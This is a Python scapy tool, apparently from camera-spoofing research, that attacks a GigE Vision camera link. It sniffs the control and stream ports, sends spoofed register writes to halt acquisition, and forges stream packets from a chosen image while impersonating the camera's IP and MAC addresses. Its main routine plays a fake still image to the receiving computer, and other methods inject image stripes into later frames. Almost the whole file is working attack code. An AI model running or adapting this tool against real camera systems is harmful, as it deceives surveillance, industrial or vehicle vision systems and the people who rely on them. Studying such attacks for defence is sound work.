# -*- coding: utf-8 -*-
import cv2
import matplotlib.pyplot as plt
import numpy as np
from typing import List
from scapy.packet import Packet,bind_layers
from scapy.fields import *
from scapy.layers.inet import UDP,IP, Ether
from scapy.plist import PacketList
from scapy.all import sniff ,sendp, sendpfast, rdpcap, Raw, PcapWriter,\
     PacketListField, StrNullField, ConditionalField, Padding
from scapy.all import hexdump
import time
from enum import IntEnum, Enum
import argparse
from pathlib import Path
import sys
sys.path.append('./src')
from gige.gige_constants import *
from gige.constansts import *
from utils.image_processing import bgr_to_bayer_rg
import random

class Method(Enum):
    WINDOWS_VIMBA = 1
    WINDOWS_MATLAB_REC = 2
    WINDOWS_MATLAB_PREVIEW = 3
    LINUX_ROS = 4

# PARAMETERS
method = Method.WINDOWS_VIMBA
camera_mac = '00:0f:31:03:67:c4'
cp_mac = '00:18:7d:c8:e6:31'

if method == Method.WINDOWS_VIMBA:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.10.150'
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8963
    sendp_ampiric_frame_time = 0.13
     
elif method == Method.WINDOWS_MATLAB_REC:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.0.1'
    img_width = 1920
    img_height = 1080
    max_payload_bytes = 8950
elif method == Method.WINDOWS_MATLAB_PREVIEW:
    interface = 'Ethernet 6'
    cp_ip = '192.168.1.100'
    camera_ip = '192.168.0.1'
    img_width = 1936
    img_height = 1216
    max_payload_bytes = 8950
elif method == Method.LINUX_ROS:
    interface = 'enp1s0'

default_request_id = 1
default_block_id = 1

gvcp_excluded_ports = [58732]


class GvcpCmd(Packet):
    # TODO split to sub commands according to the command value
    name = Layers.GVCP.value
    fields_desc=[XBitField("MessageKeyCode",0x42,BYTE),
                 XBitField("Flags",0x01,BYTE),
                 XShortEnumField("Command",None,{v.value:k for k,v in GvcpCommands._member_map_.items()}),
                 ShortField("PayloadLength",0x0008),
                 ShortField("RequestID",1),
                 XBitField("RegisterAddress",0x000130f4,4*BYTE),
                 IntField("value",None)
                 ]
bind_layers(UDP,GvcpCmd,dport=Ports.GVCP_DST.value)
bind_layers(UDP,GvcpCmd,sport=Ports.GVCP_DST.value)

class GvspLeader(Packet):
    name = Layers.GVSP_LEADER.value
    fields_desc = [ShortField("FieldInfo",0),
                    ShortField("PayloadType",0x0001),
                    XBitField("Timestamp",1,8*BYTE),
                    XBitField("PixelFormat",0x01080009,4*BYTE),
                    IntField("SizeX",img_width),
                    IntField("SizeY",img_height),
                    IntField("OffsetX",0),
                    IntField("OffsetY",0),
                    ShortField("PaddingX",0),
                    ShortField("PaddingY",0)
                  ]
    
class GvspTrailer(Packet):
    name = Layers.GVSP_TRAILER.value
    fields_desc = [ShortField("FieldInfo",0),
                    ShortField("PayloadType",0x0001),
                    IntField("SizeY",img_height)]
                    # ShortField("UnknownPadding", 0x5555)] #TODO check why originally there is padding 5555 for the UDP

class Gvsp(Packet):
    name = Layers.GVSP.value
    fields_desc=[XBitField("Status",0x0000,2*BYTE),
                 ShortField("BlockID",0),
                 XByteEnumField("Format",None,{v.value:k for k,v in GvspFormat._member_map_.items()}),
                 XBitField("PacketID",0x000000,3*BYTE),
                ]
bind_layers(UDP,Gvsp,sport=Ports.GVSP_SRC.value)
bind_layers(Gvsp,GvspLeader,Format=GvspFormat.LEADER.value)
bind_layers(Gvsp,GvspTrailer,Format=GvspFormat.TRAILER.value)

    
class GigELink():
    def __init__(self, interface: str, cp_ip: str=cp_ip, camera_ip: str=camera_ip, img_width: int=img_width, img_height: int=img_height,max_payload_bytes: int=max_payload_bytes):
        self.interface = interface 
        self.cp_ip = cp_ip
        self.camera_ip = camera_ip
        self.img_width = img_width
        self.img_height = img_height
        self.max_payload_bytes = max_payload_bytes
        self.gvsp_dst_port = -1
        self.gvcp_src_port = -1
        self.last_block_id = default_block_id - 1

    def set_gvsp_dst_port(self,  gvsp_dst_port):
        self.gvsp_dst_port = gvsp_dst_port

    def set_gvcp_src_port(self,gvcp_src_port):
         self.gvcp_src_port = gvcp_src_port

    def print_link(self):
        print('GVCP:')
        print(f'CP {self.cp_ip}({self.gvcp_src_port}) ---> Camera {self.camera_ip}({Ports.GVCP_DST.value})')
        print('GVSP:')
        print(f'Camera {self.camera_ip}({Ports.GVSP_SRC.value}) ---> CP {self.cp_ip}({self.gvsp_dst_port})')

    def _get_writereg_cmd(self, address: int, value: int, ack_required: bool = False):
        flags = 0x01 if ack_required else 0x00
        request_id = random.randint(a=1, b=0xffff)
        # request_id = default_request_id
        cmd = Ether(src=cp_mac,dst=camera_mac)/IP(
                src=self.cp_ip,dst=self.camera_ip)/UDP(sport= self.gvcp_src_port,dport=Ports.GVCP_DST.value)/GvcpCmd(
                Command="WRITEREG_CMD", Flags=flags, RegisterAddress=address,
                  value=value, RequestID=request_id)
        return cmd
    
    def _get_aquisition_cmd(self, reg_val, ack_required = False):
        return self._get_writereg_cmd(address=GigERegisters.ACQUISITION.value, value=reg_val, ack_required=ack_required)

    def send_set_height_command(self, height: int) -> None:
        cmd = self._get_writereg_cmd(address=GigERegisters.HEIGHT.value, value=height, ack_required=True)
        sendp(cmd, iface=self.interface, count=1, verbose=False) 

    def send_set_width_command(self, width: int) -> None:
        cmd = self._get_writereg_cmd(address=GigERegisters.WIDTH.value, value=width, ack_required=True)
        sendp(cmd, iface=self.interface, count=1, verbose=False) 

    def send_stop_command(self, count=1, ack_required = False):
        cmd = self._get_aquisition_cmd(reg_val=0, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)  
        
    def send_start_command(self, count=1, ack_required = False):
        cmd = self._get_aquisition_cmd(reg_val=1, ack_required=ack_required)
        sendp(cmd, iface=self.interface, count=count, verbose=False)
    
    def sniff_link_parameters(self):
        def pkt_callback(pkt):
            gvsp_port_found = self.gvsp_dst_port != -1
            gvcp_port_found = self.gvcp_src_port != -1    

            if not gvsp_port_found and pkt.haslayer(Layers.GVSP.value) and pkt[Layers.IP.value].src==self.camera_ip:
                gvsp_dst_port = pkt[Layers.UDP.value].dport
                self.set_gvsp_dst_port(gvsp_dst_port)
                print(f'Found GVSP port {gvsp_dst_port}')
            elif not gvcp_port_found and pkt.haslayer(Layers.GVCP.value) and pkt[Layers.GVCP.value].Command==0x0080 and pkt[Layers.GVCP.value].RegisterAddress==GigERegisters.CCP: #TODO change command 
                if pkt[Layers.UDP.value].sport not in gvcp_excluded_ports:
                    gvcp_src_port = pkt[Layers.UDP.value].sport
                    self.set_gvcp_src_port(gvcp_src_port)
                    print(f'Found GVCP port {gvcp_src_port}')
            
        def stop_filter(pkt):
            return self.gvsp_dst_port != -1 and  self.gvcp_src_port != -1    
        
        # sniff for ports    
        print('sniffing')
        sniff(iface=self.interface, prn=pkt_callback, filter="udp",stop_filter=stop_filter, store=0)
        self.print_link()

    def sniffing_for_trailer_filter(self, pkt):
            if pkt.haslayer(Layers.GVSP.value):
                if pkt[Layers.GVSP.value].Format=="TRAILER":
                    return True
            return False
    
    def callback_update_block_id(self,pkt):
         if pkt.haslayer(Layers.GVSP.value) and pkt[Layers.IP.value].src==self.camera_ip:
            self.last_block_id = pkt[Layers.GVSP.value].BlockID

    def stop_and_replace_with_pcap(self, frame_pcap_path, timeout=2):
        print("Stopping acquisition")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp",prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Aliasing")
        gvsp_packets = rdpcap(frame_pcap_path)
        for packet in gvsp_packets:
            packet[Layers.UDP.value].dport = self.gvsp_dst_port
            packet["IP"].src = self.camera_ip
            packet["IP"].dst = self.cp_ip
        sendp(gvsp_packets, iface=self.interface, verbose=False) 
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID
        
    def stop_and_replace_with_image(self, img_path, timeout=2):
        print("Stopping acquisition")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp",prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Aliasing")
        gvsp_packets = self.img_to_gvsp(img_path,block_id=self.last_block_id+1)
        sendp(gvsp_packets, iface=self.interface, verbose=False) 
        self.last_block_id = gvsp_packets[0][Layers.GVSP.value].BlockID

    def img_to_gvsp_using_ref(self, img_path: str, reference_gvsp_pacp: str) -> PacketList:
        img_bgr = cv2.imread(img_path) # BGR
        img_bgr = cv2.resize(img_bgr,(img_width,img_height))
        img_bayer = bgr_to_bayer_rg(img_bgr)
        payload = self.img_to_packets_payload(img_bayer)
        gvsp_packets = self.insert_payload_to_gvsp_pcap(payload,reference_gvsp_pacp)
        return gvsp_packets

    def insert_payload_to_gvsp_pcap(self, payload: List[bytes], reference_gvsp_pacp: str, block_id: int=default_block_id) -> PacketList:
        gvsp_packets = rdpcap(reference_gvsp_pacp)
        for pkt,pkt_payload in zip(gvsp_packets[1:-1], payload):
            pkt[Layers.GVSP.value].load = pkt_payload
        for pkt in gvsp_packets:
            pkt[Layers.UDP.value].src = Ports.GVSP_SRC.value
            pkt[Layers.UDP.value].dst = self.gvsp_dst_port
            pkt[Layers.IP.value].src = self.camera_ip
            pkt[Layers.IP.value].dst = self.cp_ip
            pkt[Layers.GVSP.value].BlockID = block_id
        return gvsp_packets
    
    def get_gvsp_payload_packets(self, img_path: str) -> PacketList:
        img_bgr = cv2.imread(img_path) # BGR
        img_bgr = cv2.resize(img_bgr,(self.img_width,self.img_height))
        img_bayer = bgr_to_bayer_rg(img_bgr)
        payload = self.img_to_packets_payload(img_bayer)
        return payload  
    
    def img_to_gvsp(self, img_path: str, save_pcap_debug=True, block_id: int=default_block_id) -> PacketList:        
        gvsp_packets = [] 
        
        packet_id =  0
        leader_packet = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=Ports.GVSP_SRC.value,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="LEADER", PacketID=packet_id)/GvspLeader(
                    SizeX=self.img_width, SizeY=self.img_height)
        gvsp_packets.append(leader_packet)
        packet_id += 1
        
        payload = self.get_gvsp_payload_packets(img_path=img_path)
        for pkt_payload in payload:
            next_pkt = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=Ports.GVSP_SRC.value,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="PAYLOAD", PacketID=packet_id)/Raw(bytes(pkt_payload))
            gvsp_packets.append(next_pkt)
            packet_id += 1

        trailer_packet = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
            sport=Ports.GVSP_SRC.value,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                BlockID=block_id, Format="TRAILER", PacketID=packet_id)/GvspTrailer(SizeY=self.img_height)
        gvsp_packets.append(trailer_packet)
        packet_id += 1

        gvsp_packets = PacketList(gvsp_packets)
        
        if save_pcap_debug:
            pktdump = PcapWriter('debugging_cfrafted_gvsp.pcap', append=False, sync=True)
            for pkt in gvsp_packets:
                pktdump.write(pkt)
            pktdump.close()  

        return gvsp_packets    

    def inject_gvsp_packets(self, gvsp_packets: PacketList, future_id_diff: int = 10, count: int = 100) -> None:
        print('Sniffing for blockID')
        sniff(iface=self.interface, filter="udp", prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=1)
        # modify block id to future one
        future_id = future_id_diff + self.last_block_id
        print(f'Injecting stripe with blockID={future_id}')
        for pkt in gvsp_packets:
            pkt[Layers.GVSP.value].BlockID = future_id            
        sendp(gvsp_packets, iface=self.interface, verbose=False, realtime=True,) 

    def get_stripe_gvsp_packets(self, img_path: str, first_row: int, num_rows: int, block_id: int) -> PacketList:        
        img_bgr = cv2.imread(img_path) # BGR
        img_bgr = cv2.resize(img_bgr,(self.img_width,self.img_height))
        img_bgr[:first_row, :, :] = 0
        img_bgr[first_row+num_rows:, :, :] = 0
        img_bayer = bgr_to_bayer_rg(img_bgr)
        payload = self.img_to_packets_payload(img_bayer)
        stripe_packets = []
        for pkt_id, pkt_payload in enumerate(payload):
            if (pkt_payload != 0).any():
                next_pkt = Ether(dst=cp_mac,src=camera_mac)/IP(src=self.camera_ip,dst=self.cp_ip)/UDP(
                sport=Ports.GVSP_SRC.value,dport=self.gvsp_dst_port,chksum=0)/Gvsp(
                    BlockID=block_id, Format="PAYLOAD", PacketID=pkt_id+1)/Raw(bytes(pkt_payload))
                stripe_packets.append(next_pkt)
        return stripe_packets            
    
    def inject_stripe(self, img_path: str, first_row: int, num_rows: int, future_id_diff: int = 10, count: int = 100) -> None:
        stripe_packets = self.get_stripe_gvsp_packets(img_path, first_row, num_rows, block_id=0)
        self.inject_gvsp_packets(stripe_packets, future_id_diff=future_id_diff, count=count)

    def fake_still_image(self, img_path, duration, frame_rate):
        # TODO: read register to get frames rate 
        timeout = 1 # seconds
        print('Sniffing for blockID')
        sniff(iface=self.interface, filter="udp", prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=1)
        print('BlockID found')
        print(f"Stopping acquisition for {duration} seconds with still image")
        self.send_stop_command(count=1)
        print(f"Sniffing until TRAILER is sent, timeout {timeout} seconds")
        sniff(iface=self.interface, filter="udp", prn=self.callback_update_block_id, stop_filter=self.sniffing_for_trailer_filter, store=0, timeout=timeout)
        print("Faking")
        num_frames = round(duration * frame_rate)        
        print(f'Number of fake frames = {num_frames}')
        print(f'Last GVSP BlockID = {self.last_block_id}')
        gvsp_fake_packets = self.img_to_gvsp(img_path, block_id=default_block_id)
        aliasing_started = time.time()
        iterations_time = []
        for _ in range(num_frames):
            for pkt in gvsp_fake_packets:
                pkt[Layers.GVSP.value].BlockID = self.last_block_id + 1
            itertation_started = time.time()
            sendp(gvsp_fake_packets, iface=self.interface, verbose=False) 
            iteration_ended = time.time()
            iterations_time.append(iteration_ended-itertation_started)
            
            self.last_block_id =  self.last_block_id + 1            
             
        aliasing_finished = time.time()
        print(f'Faking for {aliasing_finished-aliasing_started} seconds')
        
        print("Starting acquisition")
        self.send_start_command(count=1)

        print(f'average iteration time = {np.average(np.array(iterations_time))}')

    def img_to_packets_payload(self,img)->List[bytes]:
        # to bytes
        dst_pixels = img.flatten()
        num_packets = int(np.ceil(len(dst_pixels)/BYTES_PER_PIXEL/self.max_payload_bytes))
        payload_pixels = [dst_pixels[pkt_ind*self.max_payload_bytes:(pkt_ind+1)*self.max_payload_bytes] for pkt_ind in range(num_packets-1)]
        payload_pixels.append(dst_pixels[(num_packets-1)*self.max_payload_bytes:])
        return payload_pixels


def parse_args():
    parser = argparse.ArgumentParser()
    parser.add_argument("-p", "--path", required=True, help="path to fake image")
    parser.add_argument("-d", "--duration", type=float, default=5, help="duration of faking")
    parser.add_argument("-r", "--frame_rate", type=float, default=1/sendp_ampiric_frame_time,
        help="stream frame rate")
    
    args = parser.parse_args()
    path = Path(args.path)
    if not path.exists():
        parser.exit(1, message="The input image doesn't exist")
    args.path = str(path.resolve())
    return args

def main():
    args = parse_args()
    link = GigELink(interface)
    link.sniff_link_parameters()
    link.fake_still_image(args.path, duration=args.duration, frame_rate=args.frame_rate)

if __name__ == "__main__":
    main()